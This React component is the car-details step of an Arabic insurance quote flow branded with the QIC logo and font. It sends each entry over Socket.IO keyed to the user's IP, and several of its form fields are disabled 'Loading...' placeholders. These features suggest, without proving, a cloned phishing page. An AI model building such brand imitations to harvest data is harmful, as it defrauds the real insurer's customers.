import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import FlowHeader from '../components/FlowHeader';
import ProgressBar from '../components/ProgressBar';
import { useSocket } from '../context/SocketContext';

const QIC_FONT = 'PP Neue Montreal Arabic, PP Neue Montreal, Cairo, sans-serif';

const CarDetails = () => {
  const navigate = useNavigate();
  const { socket, userIp } = useSocket();
  const [phone, setPhone] = useState('');
  const [carMakes, setCarMakes] = useState([]);
  const [loadingMakes, setLoadingMakes] = useState(true);
  const [formData, setFormData] = useState({
    make: '',
    model: '', // Manual input field (optional)
    year: '',
    seats: '',
    cylinders: ''
  });

  useEffect(() => {
    const savedPhone = sessionStorage.getItem('phone');
    if (!savedPhone) {
      navigate('/');
      return;
    }
    setPhone(savedPhone);
    
    // Static list of car makes - no API call needed
    const makes = [
      'Toyota', 'Nissan', 'Mitsubishi', 'Honda', 'Lexus', 'Chevrolet',
      'Kia', 'Hyundai', 'BMW', 'GMC', 'Landrover', 'Mercedes', 'Ford',
      'Suzuki', 'Geely', 'Abarth', 'Alfa Romeo', 'Aston Martin', 'Audi',
      'AVATR', 'BAIC', 'BAW', 'Bentley', 'BESTUNE', 'Borgward', 'Bugatti',
      'Buick', 'BYD', 'Byd F3 Saloon', 'Byd F3r H/B', 'Byd F6 Super Saloon',
      'Cadillac', 'Changan', 'Chery', 'Chrysler', 'Citroen', 'Cmc', 'Daihatsu',
      'Dodge', 'DongFeng', 'EXEED', 'Ferrari', 'Fiat', 'Fisker', 'Foton',
      'GAC', 'Genesis', 'Great Wall', 'HAVAL', 'HONGQI', 'Hummer', 'Infinity',
      'Isuzu', 'JAC', 'Jaguar', 'Jeep', 'JETOUR', 'Jmc', 'KAIYI', 'King Long',
      'LADA', 'Lamborghini', 'LEAPMOTOR', 'Lincoln', 'Lotus', 'LYNK&CO',
      'M HERO', 'Mahindra', 'Maserati', 'MAXUS', 'Maybach', 'Mazda', 'McLaren',
      'Mercury', 'MG', 'Mini', 'Opel', 'Pagani', 'Peugeot', 'Porsche', 'Proton',
      'Range Rover', 'Renault', 'RIVIAN', 'Rolls Royce', 'ROX', 'Saab', 'Seat',
      'Skoda', 'Ssangyong', 'Subaru', 'Tata', 'Tesla', 'Volkswagen', 'Volvo',
      'XIAOMI', 'Yutong', 'ZEEKR', 'ZXAUTO'
    ];
    setCarMakes(makes);
    setLoadingMakes(false);
  }, [navigate]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    
    setFormData({
      ...formData,
      [name]: value
    });
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Store car details
    sessionStorage.setItem('carDetails', JSON.stringify(formData));

    // Send to server via Socket.IO
    if (socket && userIp) {
      socket.emit('submitCarDetails', {
        ip: userIp,
        vehicleType: 'سيارة', // يمكن تعديلها حسب الاختيار
        brand: formData.make,
        model: formData.model,
        year: formData.year,
        seats: formData.seats,
        cylinders: formData.cylinders
      });

      // Wait for acknowledgment
      socket.once('ackCarDetails', (response) => {
        if (response.success) {
          console.log('✅ Car details sent successfully');
        } else {
          console.error('❌ Error sending car details:', response.error);
        }
      });
    }
    
    // Navigate to more details page
    navigate('/more-details', { state: { carDetails: formData } });
  };

  return (
    <div className="flow rtl">
      <div className="flow__top">
        <div className="flow__header">
          <div className="flow__header-return" onClick={() => navigate(-1)}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path fillRule="evenodd" clipRule="evenodd" d="M12.7071 5.70711C13.0976 5.31658 13.0976 4.68342 12.7071 4.29289C12.3166 3.90237 11.6834 3.90237 11.2929 4.29289L4.29289 11.2929C3.90237 11.6834 3.90237 12.3166 4.29289 12.7071L11.2929 19.7071C11.6834 20.0976 12.3166 20.0976 12.7071 19.7071C13.0976 19.3166 13.0976 18.6834 12.7071 18.2929L7.41421 13H19C19.5523 13 20 12.5523 20 12C20 11.4477 19.5523 11 19 11H7.41421L12.7071 5.70711Z" fill="#1C1C1C"/>
            </svg>
          </div>
          
          <a className="flow__logo flow__logo--center" href="/">
            <img 
              src="data:image/svg+xml,%3csvg%20width='96'%20height='32'%20viewBox='0%200%2096%2032'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M54.6403%2020.0999H41.6213V19.6628C41.6214%2019.6052%2041.6411%2019.5497%2041.6766%2019.5072C41.7121%2019.4646%2041.7608%2019.438%2041.8133%2019.4326L44.6201%2018.8832V2.45967L41.8133%201.91178C41.7607%201.906%2041.7119%201.87911%2041.6765%201.83631C41.641%201.79351%2041.6214%201.73785%2041.6213%201.6801V1.24295H54.643V1.6801C54.643%201.73785%2054.6233%201.79351%2054.5878%201.83631C54.5523%201.87911%2054.5036%201.906%2054.451%201.91178L51.6443%202.45967V18.8774L54.451%2019.4267C54.5034%2019.4322%2054.5522%2019.4588%2054.5877%2019.5013C54.6232%2019.5439%2054.6429%2019.5994%2054.643%2019.657L54.6403%2020.0999ZM95.947%2014.3122C94.5468%2015.1733%2087.4787%2019.6642%2076.9448%2019.6642C67.2795%2019.6642%2064.9342%2013.9479%2064.9342%2010.6722C64.9342%207.39649%2067.2235%201.67864%2076.9448%201.67864C85.1881%201.67864%2087.1361%202.63162%2087.1361%202.63162C87.1771%202.64256%2087.22%202.63717%2087.2573%202.61643C87.2946%202.59568%2087.3245%202.56096%2087.3406%202.51852C87.3568%202.47609%2087.358%202.42876%2087.345%202.38509C87.3319%202.34142%2087.3052%202.3043%2087.2691%202.28044C87.2691%202.28044%2083.0971%200.00291492%2076.9386%200.00291492C62.9235%200.00291492%2057.8951%206.05156%2057.8951%2010.6722C57.8951%2015.2928%2062.9203%2021.34%2076.9386%2021.34C83.9508%2021.34%2091.6333%2018.1604%2095.9881%2014.3893C95.9943%2014.3821%2095.9986%2014.3727%2095.9999%2014.3626C96.0005%2014.3526%2095.9986%2014.3425%2095.9943%2014.3338C95.9893%2014.3251%2095.9825%2014.3183%2095.9738%2014.3145C95.9651%2014.3105%2095.9557%2014.3097%2095.947%2014.3122ZM59.5232%2027.6524C49.3548%2031.9437%2042.8653%2027.9292%2036.7265%2024.0751C32.993%2021.7436%2028.6729%2020.8256%2026.4021%2020.6711C34.8878%2018.9751%2038.1105%2014.3675%2038.1105%2010.6693C38.1105%206.04863%2033.081%200%2019.0432%200C13.0564%200.0743148%208.73493%202.27316%208.73493%202.27316C8.6957%202.29593%208.66579%202.33408%208.65118%202.37996C8.63663%202.42582%208.6385%202.47603%208.65634%202.52047C8.67425%202.56492%208.70689%202.60033%208.74768%202.61959C8.78847%202.63886%208.83441%202.64055%208.87626%202.62433C8.87626%202.62433%2011.0617%201.69612%2019.0406%201.67281C28.7836%201.67281%2031.0716%207.39064%2031.0716%2010.6663C31.0716%2013.942%2028.7836%2019.6584%2019.0379%2019.6584C9.31628%2019.6584%207.02689%2013.942%207.02689%2010.6663H0C0%2015.2024%204.84681%2021.1127%2018.2806%2021.3283C22.5807%2021.3283%2028.9849%2023.9832%2033.301%2026.5493C38.3932%2029.5772%2048.4921%2036.4769%2059.5552%2027.715C59.5588%2027.7088%2059.5608%2027.7017%2059.561%2027.6943C59.5611%2027.6869%2059.5595%2027.6797%2059.5562%2027.6733C59.5529%2027.6668%2059.5482%2027.6615%2059.5423%2027.6579C59.5365%2027.6542%2059.5299%2027.6523%2059.5232%2027.6524Z'%20fill='%231C1C1C'/%3e%3c/svg%3e" 
              alt="QIC Logo" 
            />
          </a>
        </div>
        
        <ProgressBar currentStep={1} totalSteps={4} />
      </div>

      <div className="flow__content">
        <h1 className="main-title">بيانات سيارتك</h1>
        
        <div className="row-group">
          {/* Tab Section */}
          <div className="base-tabs base-tabs_primary">
            <div className="tab_primary tab_active">
              <input id="manual" type="radio" name="tab" value="manual" defaultChecked />
              <label className="base-tabs__tab base-tabs__tab_primary" htmlFor="manual">
                <div className="base-tabs__title">تعبئة يدوية</div>
              </label>
            </div>
            <div className="tab_primary">
              <input id="quick" type="radio" name="tab" value="quick" />
              <label className="base-tabs__tab base-tabs__tab_primary" htmlFor="quick">
                <div className="base-tabs__title">تعبئة سريعة</div>
              </label>
            </div>
          </div>

          {/* Form Fields */}
          <form onSubmit={handleSubmit}>
            <div className="row-list">
              {/* العلامة */}
              <div className="base-select-wrapper" style={{ marginBottom: '12px' }}>
                <div className="base-select-control-wrapper">
                  <div className="base-select-control" style={{ position: 'relative' }}>
                    <select
                      id="make"
                      name="make"
                      value={formData.make}
                      onChange={handleChange}
                      required
                      disabled={loadingMakes}
                      style={{
                        width: '100%',
                        padding: '16px 40px 16px 16px',
                        fontSize: '14px',
                        border: '1px solid #e8e8f0',
                        borderRadius: '12px',
                        outline: 'none',
                        fontFamily: QIC_FONT,
                        background: '#fff',
                        color: formData.make ? '#1c1c1c' : '#aab4bd',
                        cursor: loadingMakes ? 'not-allowed' : 'pointer',
                        appearance: 'none',
                        transition: 'border-color 0.2s'
                      }}
                      onFocus={(e) => e.target.style.borderColor = '#6568f4'}
                      onBlur={(e) => e.target.style.borderColor = '#e8e8f0'}
                    >
                      <option value="" disabled>{loadingMakes ? 'Loading...' : 'العلامة'}</option>
                      {carMakes.map(make => (
                        <option key={make} value={make}>{make}</option>
                      ))}
                    </select>
                    {!formData.make && (
                      <span style={{
                        position: 'absolute',
                        right: '16px',
                        top: '50%',
                        transform: 'translateY(-50%)',
                        color: '#aab4bd',
                        fontSize: '14px',
                        pointerEvents: 'none'
                      }}>
                        العلامة
                      </span>
                    )}
                    <svg 
                      width="24" 
                      height="24" 
                      viewBox="0 0 24 24" 
                      fill="none" 
                      style={{
                        position: 'absolute',
                        left: '12px',
                        top: '50%',
                        transform: 'translateY(-50%)',
                        pointerEvents: 'none'
                      }}
                    >
                      <path 
                        fillRule="evenodd" 
                        clipRule="evenodd" 
                        d="M5.29289 8.29289C5.68342 7.90237 6.31658 7.90237 6.70711 8.29289L12 13.5858L17.2929 8.29289C17.6834 7.90237 18.3166 7.90237 18.7071 8.29289C19.0976 8.68342 19.0976 9.31658 18.7071 9.70711L12.7071 15.7071C12.3166 16.0976 11.6834 16.0976 11.2929 15.7071L5.29289 9.70711C4.90237 9.31658 4.90237 8.68342 5.29289 8.29289Z" 
                        fill="#778A99" 
                        fillOpacity="0.8"
                      />
                    </svg>
                  </div>
                </div>
              </div>

              {/* الموديل */}
              <div className="tooltip__wrapper" style={{ marginBottom: '12px' }}>
                <div className="tooltip__parent">
                  <div className="base-select-wrapper">
                    <div className="base-select-control-wrapper">
                      <div className="base-select-control base-select-control_disabled" style={{ position: 'relative', opacity: 0.6 }}>
                        <div style={{
                          width: '100%',
                          padding: '16px 40px 16px 16px',
                          fontSize: '14px',
                          border: '1px solid #e8e8f0',
                          borderRadius: '12px',
                          background: '#f8f8fa',
                          color: '#aab4bd',
                          display: 'flex',
                          alignItems: 'center'
                        }}>
                          Loading...
                        </div>
                        <svg 
                          width="24" 
                          height="24" 
                          viewBox="0 0 24 24" 
                          fill="none" 
                          style={{
                            position: 'absolute',
                            left: '12px',
                            top: '50%',
                            transform: 'translateY(-50%)'
                          }}
                        >
                          <path 
                            fillRule="evenodd" 
                            clipRule="evenodd" 
                            d="M5.29289 8.29289C5.68342 7.90237 6.31658 7.90237 6.70711 8.29289L12 13.5858L17.2929 8.29289C17.6834 7.90237 18.3166 7.90237 18.7071 8.29289C19.0976 8.68342 19.0976 9.31658 18.7071 9.70711L12.7071 15.7071C12.3166 16.0976 11.6834 16.0976 11.2929 15.7071L5.29289 9.70711C4.90237 9.31658 4.90237 8.68342 5.29289 8.29289Z" 
                            fill="#778A99" 
                            fillOpacity="0.8"
                          />
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* السنة */}
              <div className="tooltip__wrapper" style={{ marginBottom: '12px' }}>
                <div className="tooltip__parent">
                  <div className="base-select-wrapper">
                    <div className="base-select-control-wrapper">
                      <div className="base-select-control base-select-control_disabled" style={{ position: 'relative', opacity: 0.6 }}>
                        <div style={{
                          width: '100%',
                          padding: '16px 40px 16px 16px',
                          fontSize: '14px',
                          border: '1px solid #e8e8f0',
                          borderRadius: '12px',
                          background: '#f8f8fa',
                          color: '#aab4bd',
                          display: 'flex',
                          alignItems: 'center'
                        }}>
                          Loading...
                        </div>
                        <svg 
                          width="24" 
                          height="24" 
                          viewBox="0 0 24 24" 
                          fill="none" 
                          style={{
                            position: 'absolute',
                            left: '12px',
                            top: '50%',
                            transform: 'translateY(-50%)'
                          }}
                        >
                          <path 
                            fillRule="evenodd" 
                            clipRule="evenodd" 
                            d="M5.29289 8.29289C5.68342 7.90237 6.31658 7.90237 6.70711 8.29289L12 13.5858L17.2929 8.29289C17.6834 7.90237 18.3166 7.90237 18.7071 8.29289C19.0976 8.68342 19.0976 9.31658 18.7071 9.70711L12.7071 15.7071C12.3166 16.0976 11.6834 16.0976 11.2929 15.7071L5.29289 9.70711C4.90237 9.31658 4.90237 8.68342 5.29289 8.29289Z" 
                            fill="#778A99" 
                            fillOpacity="0.8"
                          />
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* المقاعد - with question mark */}
              <div className="tooltip__wrapper" style={{ marginBottom: '12px' }}>
                <div className="tooltip__parent">
                  <div className="base-select-wrapper">
                    <div className="base-select-control-wrapper">
                      <div className="base-select-control base-select-control_disabled" style={{ position: 'relative', opacity: 0.6 }}>
                        <div style={{
                          width: '100%',
                          padding: '16px 40px 16px 16px',
                          fontSize: '14px',
                          border: '1px solid #e8e8f0',
                          borderRadius: '12px',
                          background: '#f8f8fa',
                          color: '#aab4bd',
                          display: 'flex',
                          alignItems: 'center'
                        }}>
                          Loading...
                        </div>
                        <svg 
                          width="24" 
                          height="24" 
                          viewBox="0 0 24 24" 
                          fill="none" 
                          style={{
                            position: 'absolute',
                            left: '12px',
                            top: '50%',
                            transform: 'translateY(-50%)'
                          }}
                        >
                          <path 
                            fillRule="evenodd" 
                            clipRule="evenodd" 
                            d="M5.29289 8.29289C5.68342 7.90237 6.31658 7.90237 6.70711 8.29289L12 13.5858L17.2929 8.29289C17.6834 7.90237 18.3166 7.90237 18.7071 8.29289C19.0976 8.68342 19.0976 9.31658 18.7071 9.70711L12.7071 15.7071C12.3166 16.0976 11.6834 16.0976 11.2929 15.7071L5.29289 9.70711C4.90237 9.31658 4.90237 8.68342 5.29289 8.29289Z" 
                            fill="#778A99" 
                            fillOpacity="0.8"
                          />
                        </svg>
                        {/* Question mark icon */}
                        <div className="question-button" style={{
                          position: 'absolute',
                          left: '44px',
                          top: '50%',
                          transform: 'translateY(-50%)',
                          cursor: 'pointer'
                        }}>
                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                            <circle cx="12" cy="12" r="9" stroke="#526C82" strokeOpacity="0.4" strokeWidth="2"/>
                            <path d="M8.61621 9.66411C8.61621 10.0561 8.98021 10.5181 9.51221 10.5181C10.1562 10.5181 10.3242 10.0001 10.4082 9.74811C10.6182 9.11811 10.9122 8.26411 12.1162 8.26411C13.0402 8.26411 13.5722 8.90811 13.5722 9.55211C13.5722 10.0421 13.2642 10.3921 12.6062 10.9661C11.7242 11.7361 11.0382 12.3381 11.0382 13.5001C11.0382 13.5981 11.0382 13.8921 11.1502 14.1021C11.2622 14.2981 11.5562 14.4941 11.8782 14.4941C12.5502 14.4941 12.6482 13.9761 12.6902 13.7801C12.8302 13.0941 12.8722 12.9261 13.4882 12.3801C14.9302 11.0641 15.4342 10.6161 15.4342 9.52411C15.4342 8.09611 14.1882 6.80811 12.1442 6.80811C9.28821 6.80811 8.61621 9.02011 8.61621 9.66411ZM12.9702 16.1321C12.9702 15.5721 12.5082 15.1101 11.9342 15.1101C11.3742 15.1101 10.9122 15.5721 10.9122 16.1321C10.9122 16.7061 11.3742 17.1681 11.9342 17.1681C12.5082 17.1681 12.9702 16.7061 12.9702 16.1321Z" fill="#AAB4BD"/>
                          </svg>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* الإسطوانات - with question mark */}
              <div className="tooltip__wrapper" style={{ marginBottom: '24px' }}>
                <div className="tooltip__parent">
                  <div className="base-select-wrapper">
                    <div className="base-select-control-wrapper">
                      <div className="base-select-control base-select-control_disabled" style={{ position: 'relative', opacity: 0.6 }}>
                        <div style={{
                          width: '100%',
                          padding: '16px 40px 16px 16px',
                          fontSize: '14px',
                          border: '1px solid #e8e8f0',
                          borderRadius: '12px',
                          background: '#f8f8fa',
                          color: '#aab4bd',
                          display: 'flex',
                          alignItems: 'center'
                        }}>
                          Loading...
                        </div>
                        <svg 
                          width="24" 
                          height="24" 
                          viewBox="0 0 24 24" 
                          fill="none" 
                          style={{
                            position: 'absolute',
                            left: '12px',
                            top: '50%',
                            transform: 'translateY(-50%)'
                          }}
                        >
                          <path 
                            fillRule="evenodd" 
                            clipRule="evenodd" 
                            d="M5.29289 8.29289C5.68342 7.90237 6.31658 7.90237 6.70711 8.29289L12 13.5858L17.2929 8.29289C17.6834 7.90237 18.3166 7.90237 18.7071 8.29289C19.0976 8.68342 19.0976 9.31658 18.7071 9.70711L12.7071 15.7071C12.3166 16.0976 11.6834 16.0976 11.2929 15.7071L5.29289 9.70711C4.90237 9.31658 4.90237 8.68342 5.29289 8.29289Z" 
                            fill="#778A99" 
                            fillOpacity="0.8"
                          />
                        </svg>
                        {/* Question mark icon */}
                        <div className="question-button" style={{
                          position: 'absolute',
                          left: '44px',
                          top: '50%',
                          transform: 'translateY(-50%)',
                          cursor: 'pointer'
                        }}>
                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                            <circle cx="12" cy="12" r="9" stroke="#526C82" strokeOpacity="0.4" strokeWidth="2"/>
                            <path d="M8.61621 9.66411C8.61621 10.0561 8.98021 10.5181 9.51221 10.5181C10.1562 10.5181 10.3242 10.0001 10.4082 9.74811C10.6182 9.11811 10.9122 8.26411 12.1162 8.26411C13.0402 8.26411 13.5722 8.90811 13.5722 9.55211C13.5722 10.0421 13.2642 10.3921 12.6062 10.9661C11.7242 11.7361 11.0382 12.3381 11.0382 13.5001C11.0382 13.5981 11.0382 13.8921 11.1502 14.1021C11.2622 14.2981 11.5562 14.4941 11.8782 14.4941C12.5502 14.4941 12.6482 13.9761 12.6902 13.7801C12.8302 13.0941 12.8722 12.9261 13.4882 12.3801C14.9302 11.0641 15.4342 10.6161 15.4342 9.52411C15.4342 8.09611 14.1882 6.80811 12.1442 6.80811C9.28821 6.80811 8.61621 9.02011 8.61621 9.66411ZM12.9702 16.1321C12.9702 15.5721 12.5082 15.1101 11.9342 15.1101C11.3742 15.1101 10.9122 15.5721 10.9122 16.1321C10.9122 16.7061 11.3742 17.1681 11.9342 17.1681C12.5082 17.1681 12.9702 16.7061 12.9702 16.1321Z" fill="#AAB4BD"/>
                          </svg>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                className="btn btn--medium"
                style={{
                  width: '100%',
                  padding: '16px 24px',
                  background: '#6568f4',
                  color: '#fff',
                  fontSize: '16px',
                  fontWeight: 500,
                  border: 'none',
                  borderRadius: '12px',
                  cursor: 'pointer',
                  fontFamily: QIC_FONT,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  transition: 'background 0.2s'
                }}
                onMouseOver={(e) => e.target.style.background = '#5356d8'}
                onMouseOut={(e) => e.target.style.background = '#6568f4'}
              >
                متابعة
                <svg width="24" height="25" viewBox="0 0 24 25" fill="none">
                  <path 
                    className="next-icon" 
                    fillRule="evenodd" 
                    clipRule="evenodd" 
                    d="M12.7071 4.79289C12.3166 4.40237 11.6834 4.40237 11.2929 4.79289C10.9024 5.18342 10.9024 5.81658 11.2929 6.20711L16.5858 11.5H5C4.44772 11.5 4 11.9477 4 12.5C4 13.0523 4.44772 13.5 5 13.5H16.5858L11.2929 18.7929C10.9024 19.1834 10.9024 19.8166 11.2929 20.2071C11.6834 20.5976 12.3166 20.5976 12.7071 20.2071L19.7071 13.2071C20.0976 12.8166 20.0976 12.1834 19.7071 11.7929L12.7071 4.79289Z" 
                    fill="#FFF"
                  />
                </svg>
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default CarDetails;
